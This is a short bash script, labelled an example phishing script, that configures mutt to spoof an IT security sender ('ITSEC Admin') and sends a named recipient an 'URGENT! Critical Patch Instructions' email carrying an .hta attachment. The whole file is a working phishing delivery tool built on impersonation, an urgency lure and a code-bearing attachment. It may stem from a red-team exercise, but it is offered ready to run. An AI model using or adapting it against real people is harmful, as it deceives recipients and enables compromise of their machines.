#!/bin/bash
# Example phishing script.

# set .muttrc file
echo 'set edit_headers=yes' > /root/.muttrc 
echo 'set from = "IT_SISSEC@sis.uk"' >> /root/.muttrc
echo 'set realname = "ITSEC Admin"' >> /root/.muttrc

# NOTE: you need to make an email body message and save it as body.txt in the root folder
# NOTE: if you had an attachment then add that to the /root/scripts/phish directory.
echo "" | mutt -s "URGENT! Critical Patch Instructions" -i /root/scripts/phish/body.txt -a /root/scripts/phish/PatchInstructions.hta -- hannah.herriot@sis.uk



